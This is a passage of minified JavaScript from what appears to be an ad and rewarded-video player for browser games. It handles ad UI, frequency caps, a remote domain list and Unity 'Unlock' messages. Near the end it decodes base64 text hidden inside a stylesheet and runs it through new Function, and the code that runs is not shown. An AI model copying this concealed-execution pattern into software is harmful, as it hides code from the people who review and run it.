EuWQ1Rms3mGUoqkJwtxSbhG+HGHpVcAKWnkUGq7BRUXqxyvZN8rKs+xMhBY8QiLRxJyWZ3zbZctW5ap0WhGsrX6D3A2ypft2XCojgOjz4l8FYw0dtH4M01BwU2didQ5ONLAg0oca5ceo8K7a3dzUFyjAVN6SMHFKhRj0TCI3G0ht2ZOmTIls7i4uEYGgloWj0jnMAcSASTCZc2bN28yK01CU3Pszt54YD7YZQRBq1dDlS8D3aMb3E4fsEayU3zEGWeuZ3eFCva0GMDMSp2Ix2f2U4HZqhM4K7YEtkNjW5kwo0Ve5syZMxQBaYCus/hZLiuQCLmr5Tms9PT0UawdqxsP9QxlxGG9RLhGi1ZoOFJdrNvIU0UqvVQjghTUoWQ2Y2wTanDK/NIfT98qzlQRpg+p4vMgtc3HmIAMHz68MAoYLA7h4iV3tSzU54xGI/PZ8eb2HprDGqc3FWaZaFWRz7NJikaWXhOmDGFjk3XpRQuw29zCvC4jqSq0GjX5rgTilMa2UubnOTk5ucB+3kUJjIQtpNNtIX8UsnZstVdBnypBtkigzynlYre5oKa8FZwYiFrTTILUzcaAU6Xm4p7WSm6aVdCLZMoanpcB0m1Sl84qyUrk4nqiIXu6kIpqa3ZCXXUbdNjdwjgJAWK26EMZAE187aPEmTQZIgoQKhkvJwSK3EJoMlwqM6Hoc0KfLsFIDhKUFMcJU1Iddhd43D4BGI1OFfd4idI4j16vN8tjtxjuCuLlkC5xiNLKPDTxrC+tVqHiIu9LozpzqyohJWMAk1knBJrkwrweHwLjBb8vfhNV6oTo1nVKQXUMDkk8/a4ESF+bSeIMRJJ6hydSEJgsOsFFUb4sZEBBwZUlMuZOcUiMBSViAZBU+j3i4GAw6GJLUQ30peVDKFFIuSkbBnxHGzDoq9aARhuStIKb6nCBy+mBAA2AcSG5HWClBaJmdXhhfnAUvciag8DFUeNOLtL8XXqIv4uVaNVGcPrb+gwgZAWUKNxwqgPsRNrplMrXCvK3ubFDGJFsqm8X3BW5MJpwreK5hB4c0io8d0LLCoLCc/fQzYkO6q6uyd+KgFhZF+d09x1AqF0FKVtghvQso2AZbpdHmCxRX21DAncKRE7ACU9dadVCoBlvUEhFpzGxo3iXyyGLqmKBkJDsjTgpot+k1WoHyHekGeRtHbV9ikdITWlRNREv2Focwmhkc70d3ZVb3B4aHjaZ9WBO0Qu8ckZhxY7TzIZMdja4o8Meo7GVFFbcpH6GLJ3OStaOqea+ueCyvc0FVWXNUHKkDqpPNwtgkPWEhoe1qLaMkJFthux8C74PjULGGxClmvPY/BVaBTMaEEmXLi6rvb29NDOza89It/QdQIi0beiS2prJKtrxleZzeTslr0YEg+ZoZWSZISVNDwaTSPp8/HO26GEfVqmpqalXQLTbU0rVIJufWlVVdXzgwK4Xkp85+pwDQYqJ4ojWlg6oq7IJ87g62l0iyYfG6DXCOL0B0tKNQuaXiJ5yW53j8wn0X3p0gVWOHDlSEyP3wHpeJJiUhbz77rv7pk+fHpC7M+IQ8qn2nh4xjDsmAGFCXVNDhzCViOZ0ecXxeeGhIeQKg1EncIUVLUKwCiR9tVYVcxydGY1rzWghRcxtW7duLZM1chCiP7QTt9Xw8hNu2rSp2eFwnGDtXJh13lkHgqYLtducUFnWBKeONcDpkgZobrALYJB70qFrIiBS002QW2iFvMIUyMgxCZah1YceEOWS8OoDci7oMjhFxWazNe/du7c1ChixwIkJSJcTNzQ0FLN2HlIw9eyCgS6KeKLiVDOcPFIPNRUt4MSQnFwPuSa9XgfWdDPkFKQiEFYkb1MnX1CEznHJ8+uwwllK7upolMYPQPxzf6O6rIiTHjx48J8DBgy4Rb5zv+zzwKRPT3g+b6TrCXbqEV58QEYuCokrWlHGtjQ6oLHWJrgqiinC7kktgBEi7XQkbYtVFyJtDUXqPHDdTLnRPRZmsdfH2b59+yFJowZktdtWwrMQfvzxx3f7fL4uUxN5TgVjBs7pseysMJ4XDHY2oA/dE6XLa6va4PSJRig70SAQtxDgYUOTctKje0rLsEBe/1TIx5qeZRAA0ZF7UncfDCojB1zKtC632+1Yu3btcYY1BBRqwsDwLLNrbGz0otr6lHXAmIFXgEalSz7CFudlERA+rw+5wBcaaiUpS+7pZBO6pzpUUW3CLEfBPSFh0zIdllQTZOVYhOg8E3kiNcMARpNWBKJnMtH0VNXYQfOY2/ZjsdvtPgUg/FHAiJvcpaQege7777+/kXUCvTYFzht8ZdI3TDMVaXWG8Gz3JrSAylLkiKP1cPJY6DkRmzgrntyTDnnCaNJDWqYZ8gqskNPPilZhEsbcNaSgkiRtpTJ24Dww6phDQiCuhsoCwi97r8QpSbksoa5ataoELeU71kEXDFsg+NlkSma2BYxmvdCj/X6/8PgBgVB2oh4aamxi/inkngxh91SYFiLtHCOkpOpCcYWK71EgQp3Ngvd2DXNbSUnJ0Y8//rgaFJYPZACT1PPrvII/FE7+ySefrFXKgk4b+19J3XR6NjVwqjCARJYiLATj9nZOXhPckwHdU4pJ2DennwWyck1oISH3RGuehNc56ely0eibBVBY5dVXX/0iinX4ZYB0m0OA9QWPPfbYv1ACf886kJ7zLsq9MHEFY9ai/7cI6khv0HauGESVkoGkoCi4y86zQG5BClqIEUzonrSie+qtQUuKsUYhmbNKWVnZiXXr1pXKO6xYpSs7RAMlLg6hZwwjnpoC2fQWjUZTNm3atKs4RpTUP3scnKjcKQ7vxmmSXChDa0k1YgxhEp4NMVtMaDEmYXZIeqZJ4Ahrul4I7mgStirB6TuJFoMuBa6a+gRz3S1acGb58uVvYfzRKgGAEmceyatbrPJFBXwyYGKLnoKCgjAI4Xmq4aeDaJCKlisybtu27eFhw4ZdyzoBTSbb9O0Twoo/iUheUlYkc+nxBJ/vjPwN5aRC62ElMmUn2UJS/qppy6FAIVe3e/fu4muvvXaDDAhqfEqi0aC7Q6wd4v9OCTjeREEJW4h8+DHCSoqLi48sXLhwNlqLmTVmkGLMgVM13yWgfUPyl+QqKSWdOLmNXrXirJCQeurtSRUcXD7hXhiYN5G5tb29vW3RokX0PIhH4o68ELnEhktmIV6x+hO1jjAg8gEV+bQWVVNTUyA1NbV8woQJszlGK2VYB4BOYxRWR/h3KjPG3gqjimYrZRSCzz777N++/vrrWrFRfRIrkbuqcPVKrELKJ3EnGKUWIreUiDlHO3bsaLz44os1+fn549ip6mGCfi+v3wd9/bdUqE/NOG9J1Hhq69atXz755JO7JSTuk1mHHAwpf/gZ0je5bK9M0kl7hQd96ZuVlZXFSiejKH7upIeEaLevFloN6IqJD8J5g+Yr7kMxxy9/+cutDHnrY5C6F3pwDS0+Chh+mYl6aelt5JLfNTc3H1c64aC8ybBg5nPC+ElfK7Sq3IKZz8Lg/IsU90GZX7t48eJ3vJTTidIWCqD4FYLCpDhEziXMGXltbW2BPVjmzZs3SafTWdnZ0jQY2f9SYYFLesaiL5ThhTNh/pRHUYBkK+6DXNmAHe7V0tJSuwwMTxRXJVdUclASs2Dp8kzQdZYEk1eqqqq8+/bt+37OnDkX6vV6K9s1qNFaJqGcHAP1LSfA6bGdEyDSLP3QRS2D8UOuEtxVFDDqaUXuw4cPtylYhRwMV5TYI5gMf8gBkVsJMMDofK2oqPB88803u+bOnTvGaDQq/nIx9cjRA+eg1aRCS3tlwgvVJJ3ENGbBlJGL4JLz71KcPRIuNTU1FWgZr2HwZ5O4bR8j9lACw5dsIMgKDOUWErEaECNYpGoQqz4rK8uyfv36+4cMGTIt1pcFgn4owcj+wKlPoK7lRK8AkZ06GNXTfBhaMCPaNNDOcujQoQM33HDDey0tLW4FRRUGwSkJBqXL/rFcVgCSXO6PBYgcFE0UUDpfX3755Xnz58//Of2iTjxf3IzWcrJqF5TWfo88cyr+RWYYkXZ22hBhZWsaYqYFlOMp9LN8Gzdu3LJs2bId4gLJfollhN2UWxaVu6KA4VVQWclbCC2CKS5ixkcBJby6mkECjlCvv/76IU888cRSWpw4kYuglSFqhbXfT0OrvUZ4OMjlbgOv343bnGKGmWay68GAOoIUXKopTwhI89JHgEad2G8bI1/ULV++/L1NmzZVRJH57iiAyINBubvqGZclAaTLmoti1TIsRVp1yEmm1atXXz1jxoyr6Pee+pLspd9l/+KLL7564IEHttntdm+0mEsGhryy+CPpMRBFlUWLYFKV/EgJa25q1AST2+0OfPjhh8dRGRePGjXKkpGRUcD1flIqei4Ty4EDB/bffffdb77yyiuHPB6PLwYYHgYYSvmqbsUd8qKOnpPtlG+ceMFyOax0TBAVWDXK4j+jCvvovvvumz969OjJqtBDJmet0HrtNA6+cuXKr7Zv314ncyd+WcJQyhvSpKESGCxV1e2ckeJS40orWzPcl3xtW+lSeJ1LGCEgaXfdddeUqVOnTs7Ozi7qTSBqa2srsUPsRWvYd+zYsXZZXOBXsAylhKHcRfXqcuMJr/3OAEUDZ1ZXY63e2WV9wiuuuIJ+wW08urThhYWFg1m/3ZFI8Xq9nvLy8lKUsCc3bNhwaNu2bXUKKSFWXsona2yPDAR58OeFXlz7PeYPuiiQPA+Ri6+wlr7TyT7XSPYPg8obDAY1gjPo/PPPLxg4cGA+ck6G1WpNw8+N9HAlVi1JVGp0rPTLoU4blsbGxpZTp07Rb+hWI2eVu1wulh8PKCRM/ZKG9TIAYWVwPTI35e9pMOICJAFQNDJwWIBoZICooeuD9vLXaIKCtcJ0gPEqjTFYiUKPAiheBc7oFTBYgWGMcT6m+1IxrEUjc2dSsOTrTLGWpGA9581FER8QxUUpuSl5xtajYBGspGGvgBFLZSndOEDkckMsNyGfGhMGQ74knnyJ1WSe8w7GCQaLxOUpdJaKkvNFr4GRKCBKoARjEKj0xuSLfUndl3ydECVAuCiWIecLJd5gjW34ZK9+RvTdq2AkAwgLFE62LRBjpE2+LJ5a5voSsZJ4rMPH6Bg+Bghyi+j2pLezBYi8d3IKjRNkAKKWuCul1djisRJIwDqigaI00U3OFXJvAH0NECkY0mhe3jjhFdVUkpuXW4QKlFfUibaQixKRBxmAyIHxA3u2YSyu6PXZG+puHh+MoXjk7kMleY22tJHSYsSxLEQqKoLAnpkeiAJEtKegzkpR99B5WLwityBeBgZrSSMly+AZSc5YpB5k9Hi/wvtgFJ44q3Oa1D14riDDnbGA8YPyckbyoDAZlcWK0FlKqU8B0RuAxAsMJ7EiPgpX8ApAcFGidFYDB+JwR+cciHD5PwEGAEzWcaxTRAjOAAAAAElFTkSuQmCC) #94af50;\n                    background-size: 100px;                    \n                }");
                    a.s("." + this.rewarded.Ya.classList[0] + ':after{\n                    content:"+ ' + this.rewarded.Pf / 60 + ' min";\n                    display:block;\n                    width:100%;\n                    font-size:28px;\n                    font-weight:600;\n                }');
                    a.s("." + this.rewarded.Ya.classList[0] + ".wgRwLoading:before{\n                    content: \" \";\n                    position:absolute;\n                    top:0;\n                    left:0;\n                    width:100%;\n                    height:100%;\n                    border-radius:10px;\n                    background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='38' height='38' viewBox='-2 -2 40 40' stroke='%23fff'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg transform='translate(0 0)' stroke-width='4'%3E%3Ccircle stroke-opacity='.5' cx='18' cy='18' r='18'/%3E%3Cpath d='M36 18c0-9.94-8.06-18-18-18' transform='rotate(344.043 18 18)'%3E%3CanimateTransform attributeName='transform' type='rotate' from='0 18 18' to='360 18 18' dur='1s' repeatCount='indefinite'/%3E%3C/path%3E%3C/g%3E%3C/g%3E%3C/svg%3E\") !important;\n                    background-repeat: no-repeat;\n                    background-position: center center;\n                    background-color:rgba(0,0,0,.7);\n                    cursor:default;\n                }");
                    c.appendChild(this.rewarded.Ya)
                },
                vk: function() {
                    this.container.classList.remove("wgHidden");
                    this.container.classList.add("wgShow")
                },
                Cj: function() {
                    this.container.classList.add("wgHidden")
                },
                wg: function() {
                    this.rewarded.bf = !0;
                    0 < a.rewarded.currentTime ? (this.rewarded.ud.classList.remove("wgHidden"), this.rewarded.Kc.innerHTML = "Extra Time") : (this.rewarded.ud.classList.add("wgHidden"), this.rewarded.Kc.innerHTML = "Time is up!");
                    a.rewarded.pc.classList.add("wgShow");
                    a.rewarded.pc.classList.remove("wgHidden");
                    a.rewarded.Da.classList.remove("wgVisible");
                    a.rewarded.Da.classList.add("wgHidden")
                },
                Aj: function() {
                    this.rewarded.bf = !1;
                    a.rewarded.pc.classList.remove("wgShow");
                    a.rewarded.pc.classList.add("wgHidden");
                    a.rewarded.Da.classList.add("wgVisible");
                    a.rewarded.Da.classList.remove("wgHidden")
                },
                Xe: function() {
                    clearTimeout(this.rewarded.Me);
                    if (!1 === this.rewarded.Gf) return !1;
                    this.rewarded.Eh.call(this);
                    this.rewarded.container.classList.remove("wgS1");
                    this.rewarded.Xh.makeRewardedVisible()
                },
                Pi: function() {
                    function b(w) {
                        "touchstart" === w.type ? (x = w.touches[0].clientX - z, A = w.touches[0].clientY - y) : (x = w.clientX - z, A = w.clientY - y);
                        w.target === e && (p = !0, setTimeout(function() {
                            this.rewarded.Gf = !1;
                            w.target.classList.add("wgDragging")
                        }.bind(this), 150))
                    }

                    function c(w) {
                        x = m;
                        A = r;
                        p = !1;
                        setTimeout(function() {
                            this.rewarded.Gf = !0;
                            w.target.classList.remove("wgDragging")
                        }.bind(this), 150)
                    }

                    function d(w) {
                        p && (w.preventDefault(), "touchmove" === w.type ? (m = w.touches[0].clientX - x, r = w.touches[0].clientY - A) : (m = w.clientX - x, r = w.clientY - A), z = m, y = r, e.style.transform = "translate3d(" +
                            m + "px, " + r + "px, 0)")
                    }
                    this.rewarded.Da = document.createElement("div");
                    this.rewarded.Da.className = "wgRewardRibbon";
                    this.rewarded.Da.classList.add("wgHidden");
                    this.rewarded.Ub.parentNode.appendChild(this.rewarded.Da);
                    this.rewarded.Da.addEventListener("click", this.rewarded.wg.bind(this));
                    var e = this.rewarded.Da,
                        g = this.G(),
                        p = !1,
                        m, r, x, A, z = 0,
                        y = 0;
                    g.addEventListener("touchstart", b.bind(this), !0);
                    g.addEventListener("touchend", c.bind(this), !0);
                    g.addEventListener("touchmove", d.bind(this), !0);
                    g.addEventListener("mousedown", b.bind(this), !0);
                    g.addEventListener("mouseup", c.bind(this), !0);
                    g.addEventListener("mousemove", d.bind(this), !0)
                },
                Ye: function() {
                    this.rewarded.bf = !1;
                    this.rewarded.vk();
                    this.rewarded.Da.classList.remove("wgHidden");
                    this.rewarded.Da.classList.add("wgVisible");
                    this.rewarded.container.classList.remove("wgS1");
                    this.rewarded.Fk()
                },
                Eh: function() {
                    if ("ongamerestore" === a.options.rewarded.init) return !1;
                    this.rewarded.Da.classList.add("wgHidden");
                    this.rewarded.Da.classList.remove("wgVisible");
                    this.rewarded.container.classList.add("wgS1")
                },
                dk: function() {
                    if (this.rewarded.Ya.classList.contains("wgRwLoading")) return !1;
                    this.rewarded.Ya.classList.add("wgRwLoading");
                    a.ra = window.googletag || {
                        cmd: []
                    };
                    a.ra.cmd.push(this.rewarded.initSlot.bind(this))
                }
            },
            tb: {
                ha: !1,
                container: null,
                Qe: null,
                Pe: null,
                ue: null,
                init: function() {
                    this.container = a.F("div", "PageLoader");
                    this.container.innerHTML = '<div class="wgLoadingDot"></div><svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle id="wgCircle" class="wgCircle" cx="50" cy="50" r="0.1" fill="' +
                        (a.options.tr ? a.options.tr.bg : "#fff") + '"/></svg>';
                    a.s(".wgPageLoader,.wgPageLoader svg{top:0;left:0;width:100%;height:100%;overflow:hidden;position:absolute; z-index:9999999999999999999999999999999}@-webkit-keyframes wgMoveRight{to{-webkit-transform:translateX(20px)}}@keyframes wgMoveRight{to{transform:translateX(20px)}}@-webkit-keyframes wgMoveLeft{to{-webkit-transform:translateX(-20px)}}@keyframes wgMoveLeft{to{transform:translateX(-20px)}}.wgPageLoader{display:none}.wgPageLoader svg{z-index:-1}.wgLoadingDot{position:absolute;top:50%;left:50%;width:1px;height:1px}.wgLoadingDot::after,.wgLoadingDot::before{content:'';position:absolute;width:20px;height:20px;top:50%;left:50%;margin:-10px 0 0 -10px;border-radius:50%;visibility:hidden;opacity:0;z-index:1000;-webkit-transition:opacity .15s,visibility 0s .15s;transition:opacity .15s,visibility 0s .15s}.wgLoadingDot::before{background:" +
                        (a.options.tr ? a.options.tr.c1 : "#4fc3f7") + "}.wgLoadingDot.wgShow::before{opacity:1;visibility:visible;animation:wgMoveRight .3s linear infinite alternate;transition:opacity .3s}.wgLoadingDot::after{background:" + (a.options.tr ? a.options.tr.c2 : "#6cc88a") + "}.wgLoadingDot.wgShow::after{opacity:1;visibility:visible;animation:wgMoveLeft .3s linear infinite alternate;transition:opacity .3s}");
                    a.u().appendChild(this.container);
                    this.ue = this.container.getElementsByClassName("wgCircle")[0];
                    this.ha = !0
                },
                Bl: function() {
                    return this.container
                },
                show: function(b) {
                    b = void 0 === b ? 0 : b;
                    "undefined" !== typeof b && 0 < Math.ceil(b) && (this.ii = b);
                    window.requestAnimationFrame(this.li.bind(this))
                },
                aa: function() {
                    window.requestAnimationFrame(this.ki.bind(this))
                },
                ii: 2,
                li: function(b) {
                    this.Qe || (this.Qe = b);
                    b = Math.ceil(Math.ceil(b - this.Qe) / this.ii);
                    this.ue.setAttribute("r", b);
                    this.container.style.display = "block";
                    10 < b && this.container.getElementsByClassName("wgLoadingDot")[0].classList.add("wgShow");
                    110 > b ? window.requestAnimationFrame(this.li.bind(this)) : this.Qe = null
                },
                Bj: 2,
                ki: function(b) {
                    if (!this.ue) return !1;
                    this.Pe || (this.Pe = b);
                    b = 110 - Math.ceil(Math.ceil(b - this.Pe) / this.Bj);
                    this.ue.setAttribute("r", Math.abs(b));
                    10 > b && this.container.getElementsByClassName("wgLoadingDot")[0].classList.remove("show");
                    110 >= b && 0 <= b ? window.requestAnimationFrame(this.ki.bind(this)) : (this.container.style.display = "none", this.Pe = null)
                }
            },
            Ri: function() {
                return !0 === a.isFlashGame && a.isMobile() && !a.Nj() ? !1 : !0
            },
            rg: function(b, c) {
                if (!a.qg) return a.j(142, b), !1;
                window.sessionStorage.setItem(b, c)
            },
            te: function(b) {
                try {
                    return window.sessionStorage.getItem(b)
                } catch (c) {
                    return a.j(143, b), !1
                }
            },
            da: {
                lb: null,
                pa: null,
                resume: function() {
                    try {
                        window[f.game.game].SendMessage(this.lb, "Resume")
                    } catch (b) {
                        a.j(144)
                    }
                },
                pause: function() {},
                qb: function() {},
                tm: function() {}
            },
            kl: function(b) {
                a.j(145, b);
                if (!b) return a.j(146), !1;
                if (b === a.Rd) return a.j(147), !0;
                a.j(146);
                return !1
            },
            Nk: function() {
                return window.preroll.config.loaderObjectName.da.lb
            },
            go: null,
            ping: function(b) {
                a.j(148, b);
                a.da.lb = b;
                var c = f.game ? f.game : {};
                c.key = "_246_";
                c.docDomain = document.domain;
                c.adBlock = a.Za;
                c.uniqueId = a.Rd;
                c.dndName = b;
                a.go = c;
                if ("undefined" !== typeof f.game && "undefined" !== typeof f.game.game && null !== f.game && "undefined" !== typeof window[f.game.game]) try {
                    a.da.pa = window[f.game.game], window[f.game.game].SendMessage(b, "Unlock", encodeURIComponent(JSON.stringify(c))), a.j(149)
                } catch (d) {} else a.$g(b, c)
            },
            $g: function(b, c) {
                a.j(150);
                if (window.wgUnityInstance) a.da.pa = window.wgUnityInstance, a.da.pa.SendMessage(b, "Unlock", encodeURIComponent(JSON.stringify(c)));
                else
                    for (var d in window) try {
                        window[d] && "function" === typeof window[d].hasOwnProperty && window[d].hasOwnProperty("SendMessage") && window[d].hasOwnProperty("SetFullscreen") && (a.da.pa = window[d], a.da.pa.SendMessage(b, "Unlock", encodeURIComponent(JSON.stringify(c))), a.j(151), a.j(152, b))
                    } catch (e) {}
                a.da.pa || setTimeout(function() {
                    a.j(153);
                    a.$g(b, c)
                }, 100)
            },
            Gl: function() {
                var b = document.getElementsByTagName("script"),
                    c = b[b.length - 1];
                return function() {
                    return c.src
                }
            }(),
            cd: function() {
                var b = document.getElementsByTagName("script");
                if (b && 0 < b.length)
                    for (var c in b)
                        if (c = parseInt(c, 10), b[c].src && (-1 < b[c].src.indexOf("wgAds.js") || -1 < b[c].src.indexOf("/afg/v6/")) && -1 === b[c].src.indexOf("wgplayer.com/afg/v6/logs.js")) return b[c].src
            },
            yc: function() {
                var b = /.*st\.wgplayer\.com\/(.*)\/js.*/i;
                try {
                    var c = a.cd().match(b);
                    return c[1]
                } catch (d) {
                    return document.domain
                }
            },
            qj: function() {
                var b;
                if (-1 === a.cd().indexOf("wgplayer.com/afg/v6/logs.js")) {
                    if ((b = a.cd().match(/.*st\.wgplayer\.com\/(.*?)\/js.*/i)) || (b = a.cd().match(/.*afg\.wgplayer\.com\/(.*?)\/js.*/i))) return [b[1].split(".").slice(Math.max(b[1].split(".").length -
                        2, 0)).join("."), b[1]];
                    if (b = a.cd().match(/.*(dev\.wgplayer\.com)\/(.*\.js).*?/i)) return [b[1].split(".").slice(Math.max(b[1].split(".").length - 2, 0)).join("."), b[0].replace(b[2], "").slice(0, -1)]
                }
                return !1
            },
            Mb: function(b) {
                if (!b) return !1;
                for (var c in a.spqr)
                    if (c = parseInt(c, 10), -1 < b.indexOf(a.spqr[c])) return !0;
                return !1
            },
            mj: function() {
                a.j(154); - 1 < a.od.indexOf("ALL") && (a.j(155), a.noAd = !0, a.Zf = !0);
                a.ih()
            },
            Ga: function() {
                return a.Aa("gapi") ? !0 : !1
            },
            Ik: function(b) {
                a.j(157);
                for (var c in a.od) a.od[c] === b && (a.noAd = !0, a.Zf = !0);
                a.ih()
            },
            ke: function(b) {
                b = void 0 === b ? !1 : b;
                var c = a.oj("wgpcpp_1");
                c = c ? JSON.parse(atob(c)) : {
                    v: [],
                    vs: [],
                    i: [],
                    t: []
                };
                if (!0 === b) {
                    for (var d in c)
                        if (c.hasOwnProperty(d))
                            for (b = c[d].length; b--;) a.rj((new Date).getTime(), c[d][b]) > h[d].i && c[d].splice(b, 1);
                    a.ci("wgpcpp_1", btoa(JSON.stringify(c)))
                }
                return c
            },
            Hf: function(b) {
                b = void 0 === b ? null : b;
                if (!0 === a.Kf) return !1;
                b = b ? b : a.currentAd;
                var c = a.ke();
                return a.Ec() ? 0 === h.i.m || c.i.length < h.i.m : a.Nb() && !b.isSkippable() ? 0 === h.v.m || c.v.length < h.v.m : a.Nb() && b.isSkippable() ? 0 === h.vs.m || c.vs.length < h.vs.m : a.$f() ? 0 === h.t.m || c.t.length < h.t.m : !0
            },
            Qa: {},
            Pg: !1,
            Fd: null,
            Zf: !0,
            noAd: !1,
            od: [],
            hm: null,
            cf: null,
            wc: null,
            fm: -1,
            Kf: !1,
            Ti: !0,
            al: !0,
            Gh: function() {
                window.addEventListener("storage", function(e) {
                    e.storageArea == window.localStorage && "wgpcpp_1" === e.key && (a.ke(), a.j("WGP: LS has changed."))
                });
                var b = a.G().querySelectorAll("[data-wgplayer]"),
                    c;
                for (c in b)
                    if ("DIV" === b[c].nodeName && b[c].parentNode) {
                        b[c].parentNode.removeChild(b[c]);
                        var d = document.getElementsByClassName("wgLoadingAnim")[0];
                        d && d.parentNode.removeChild(d)
                    } a.j(158);
                "undefined" !== typeof a.options.exc && 0 < a.options.exc.length && a.od.push.apply(a.od, w$(a.options.exc ? a.options.exc : []));
                a.Qa.prefetchMidroll = !0 === a.options.prefetchMidroll ? !0 : !1;
                a.Qa.prefetchPreroll = !0 === a.options.prefetchPreroll ? !0 : !1;
                a.options.ect && 0 < a.options.ect && (a.Rh = a.options.ect);
                a.options.$c || (a.options.$c = []);
                !a.Aa("wgloc_") || -1 < a.od.indexOf("ALL") ? (a.j(159), a.mj()) : (a.j(160, a.Aa("wgloc_")), a.Ik(a.Aa("wgloc_")))
            },
            Uj: function() {
                return a.styleSheet.innerText.match(/`(.*)`/i)[1]
            },
            ih: function() {
                if (!window.WGPlayerUnified && !a.Ca() && !0 !== a.options.noint) {
                    var b = document.createElement("script");
                    b.type = "text/javascript";
                    document.head.appendChild(b);
                    b.src = -1 < window.location.href.indexOf("dev.wgplayer.com/") ? "https://dev.wgplayer.com/afg/v6/vignette.1.1.0.js?g=true&d=wgplayer.com" : "https://st.wgplayer.com/vignette.min.js?odevverride=true"
                }
                b = new Promise(function(d, e) {
                    var g = new XMLHttpRequest;
                    g.overrideMimeType("text/plain");
                    g.open("GET", "https://wgplayer.xyz/stats/files/pv", !0);
                    g.onreadystatechange = function() {
                        if (4 === g.readyState && "200" == g.status) {
                            for (var p = atob(g.responseText).split("\n"), m = 0; m < p.length; m++)
                                if (!a.Ca()) {
                                    if ("" !== p[m].trim() && -1 < a.cd().indexOf("/" + p[m].trim() + "/")) {
                                        a.Md = !1;
                                        a.j(164, p[m].trim());
                                        break
                                    }
                                } else if ("" !== p[m].trim() && -1 < a.cf.hostname.indexOf(p[m].trim())) {
                                a.Md = !1;
                                a.j(165, a.cf.hostname);
                                break
                            }
                            a.sd();
                            d()
                        }
                    };
                    g.send(null);
                    g.onerror = function() {
                        e()
                    }
                });
                if (!a.cf) {
                    var c = document.createElement("a");
                    c.href = document.referrer ? document.referrer : document.domain;
                    a.cf = c
                }
                b.then(function() {
                    a.sh()
                }).catch(function(d) {
                    a.sh();
                    a.Ga() && console.log(d)
                })
            },
            wm: "Initial, ",
            sh: function() {
                !0 === a.options.fc && !0 === a.options.prefetchPreroll ? (window.googlefc = window.googlefc || {}, window.googlefc.ccpa = window.googlefc.ccpa || {}, window.googlefc.callbackQueue = window.googlefc.callbackQueue || [], window.googlefc.callbackQueue.push({
                    CONSENT_DATA_READY: function() {
                        window.__tcfapi("getTCData", 2, function() {
                            a.Xf()
                        })
                    },
                    INITIAL_CCPA_DATA_READY: function() {
                        window.__tcfapi("getTCData", 2, function() {
                            a.Xf()
                        })
                    }
                })) : a.Xf()
            },
            Hh: function() {
                if ("undefined" === typeof window.RufflePlayer) {
                    a.Ug();
                    window.RufflePlayer = window.RufflePlayer || {};
                    window.RufflePlayer.config = {
                        polyfills: !1,
                        autoplay: "on",
                        unmuteOverlay: "hidden",
                        backgroundColor: "#12385a"
                    };
                    var b = document.createElement("script");
                    b.id = "wgFlashEmulator";
                    b.addEventListener("load", function() {
                        if ("undefined" !== typeof window.RufflePlayer && !0 === a.options.fe && a.gh()) {
                            a.Ga() && console.log("USE ruffle");
                            if (0 < a.contentContainer.querySelectorAll("object > embed").length) {
                                var c = a.contentContainer.querySelectorAll("object > embed")[0];
                                var d = c.src
                            } else 0 < a.contentContainer.querySelectorAll("embed").length ? (c = a.contentContainer.querySelectorAll("embed")[0], d = c.src) : 0 < a.contentContainer.querySelectorAll("object").length && (c = a.contentContainer.querySelectorAll("object")[0], d = c.querySelectorAll("param[name=movie]") && c.querySelectorAll("param[name=movie]")[0].value || c.querySelectorAll("param[name=movie]") && c.querySelectorAll("param[name=data]")[0].value);
                            var e = window.RufflePlayer.newest().createPlayer();
                            a.G().classList.add("wgContent");
                            if (c) {
                                a.gi("Loading game ...");
                                var g = "ruffle-player{\n                                display:block;\n                                width:" + c.getBoundingClientRect().width + "px;\n                                height:" + c.getBoundingClientRect().height + "px;\n                            }";
                                a.s(g);
                                c.replaceWith(e);
                                document.addEventListener("ruffleReady", function() {
                                    a.xe();
                                    a.G().classList.remove("wgContent")
                                });
                                e.load(d)
                            }
                        }
                    });
                    document.head.appendChild(b);
                    b.src = "https://st.wgplayer.com/ruffle/ruffle.js"
                }
            },
            Xf: function() {
                if (!0 === a.Pg && a.contentContainer) return a.j(161), !1;
                a.j(162);
                a.Pg = !0;
                a.j(163);
                if (!0 === a.options.cap && !window.grecaptcha && !a.Aa("_wgcap__")) {
                    var b = document.createElement("script");
                    b.type = "text/javascript";
                    b.src = "https://www.google.com/recaptcha/api.js?render=6LczYa0ZAAAAAIv-piHSiu9ukgvBxIr_rskeengV";
                    document.head.appendChild(b);
                    b.addEventListener("load", function() {
                        a.Fd = !0
                    });
                    b.addEventListener("error", function() {
                        a.Fd = !1
                    })
                }
                a.rewarded && a.options.rewarded && "auto" === a.options.rewarded.init && !a.rewarded.ha ? a.rewarded.init(a.options.rewarded) : a.rewarded && a.options.rewarded && "ongamerestore" === a.options.rewarded.init && !0 === a.options.noAd && a.rewarded.init(a.options.rewarded);
                if ("undefined" !== typeof a.options.spqr)
                    if ("object" === typeof a.options.spqr)
                        for (var c in a.options.spqr) a.spqr.push(a.options.spqr[c]);
                    else a.spqr.push(a.options.spqr);
                a.Xa && (a.Xa.Lc = !0 === a.options.ltr ? {
                    p: !0,
                    cb: !0
                } : {
                    p: !1,
                    cb: !1
                });
                !1 === a.options.ria && (a.ria = !1);
                "undefined" !== typeof a.options.lt && (a.lt = 0 < parseInt(a.options.lt, 10) ? parseInt(a.options.lt, 10) : 0);
                a.lt = 1;
                a.wc = a.yc();
                a.options = f ? f : window.preroll.config;
                a.options.flashIcon || (a.options.flashIcon = "");
                a.te("jingleCount") || a.rg("jingleCount", 0);
                a.ea.time.interact = (Date.now() - a.ea.time.init) / 1E3;
                "function" === typeof window[f.preAfgCallback] && window[f.preAfgCallback].call();
                if (!a.contentContainer) return a.j(166), !1;
                a.jingle.Di();
                a.ai();
                a.Ki();
                a.vb();
                a.bk();
                a.sd();
                a.tb.init();
                !a.O && a.isMobile();
                a.td();
                a.Ni();
                a.Mi();
                a.Ji();
                a.Ug();
                a.gh();
                a.Ei();
                a.Hi();
                a.Ai();
                a.contextMenu = new a.Sj;
                a.contextMenu.Gj();
                a.contextMenu.yi();
                (new Function(atob(String.fromCharCode(97).toLowerCase() + a.Uj()))).apply([a, a.qj(), a.Ga(), a.R, a.destroy, a.Tg.name]);
                f.poster && f.poster.pre && a.Ng("preroll");
                f.poster && f.poster.mid && a.Ng("midroll");
